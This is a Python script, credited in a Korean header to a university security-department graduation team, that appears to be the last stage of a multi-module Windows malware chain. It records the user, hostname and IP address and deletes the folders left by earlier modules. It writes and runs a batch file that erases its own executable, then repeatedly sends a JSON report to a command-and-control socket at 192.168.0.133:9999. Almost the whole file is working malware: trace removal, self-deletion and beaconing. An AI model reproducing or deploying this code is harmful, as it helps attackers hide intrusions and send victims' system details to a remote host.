#
#
# 해당 코드는 중부대학교 정보보호학과 '공격해조' 졸업 팀이 제작한 코드입니다.
#
#

import os
from re import A
import shutil
import getpass
import os.path
import subprocess
import urllib.request
import socket
import threading
import json


# 0. 세팅
# 사용자 이름 획득
c = getpass.getuser()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
e = s.getsockname()[0]
# 현재 실행 중인 파일
dri = "share2"
# 통신 관련 세팅
info_List = []
m_dict = {'NAME': '', 'IP': '', 'INFO': ''}
hostname = subprocess.check_output(['hostname']).decode(
    'utf-8').replace('\r', '').replace('\n', '')


# 1. 통신
def Socket_Create():
    Host = '192.168.0.133'
    Port = 9999

    global Client_Socket

    Client_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Client_Socket.connect((Host, Port))

    receive_thread = threading.Thread(target=info_send)
    receive_thread.start()


def info_send():
    print('info_send start')
    m_dict['NAME'] = hostname
    m_dict['IP'] = e
    m_dict['INFO'] = make_List(info_List)
    while True:
        try:
            Client_Socket.sendall(json.dumps(m_dict).encode('ascii'))
        except Exception as error:
            print("Error!", error)
            Client_Socket.close()
            break


def make_List(info_List):
    info_Lists = '[M4]\n'
    for info_name, info_state in info_List:
        info_List = info_name + ': ' + info_state + '\n'
        info_Lists += info_List
    return info_Lists


# 2. 삭제 루프
def file_delete():
    try:
        dir_path0 = "C://Module2"
        dir_path1 = "C://Module2.5"
        dir_path2 = "C://Windows//Module3"

        if os.path.exists(dir_path0):
            shutil.rmtree(dir_path0)
            shutil.rmtree(dir_path1)
            shutil.rmtree(dir_path2)

        else:
            if os.path.exists(dir_path1):
                shutil.rmtree(dir_path1)
                shutil.rmtree(dir_path2)

            else:
                if os.path.exists(dir_path2):
                    shutil.rmtree(dir_path2)

        print("all clear")
        info_List.append(('all clear', 'Ok'))
    except:
        info_List.append(('all clear', 'No'))


# 3. 자가 삭제
def self_delete():
    try:
        f = open("C:\\killfile.bat".format(c), 'w')
        f.write(":Repeat\n")
        f.write("del \"C:\\share2\\M4_v1.0.exe\"\n")
        f.write("rmdir \"C:\\{}\"\n".format(dri))
        f.write("if exist {} goto Repeat\n".format(dri))
        f.write("del /s /q \"C:\\killfile.bat\"")
        f.close()

        os.startfile('C:\\killfile.bat'.format(c))
        info_List.append(('self delete', 'Ok'))
    except:
        info_List.append(('self delete', 'No'))


# 4. Main
file_delete()
self_delete()
Socket_Create()
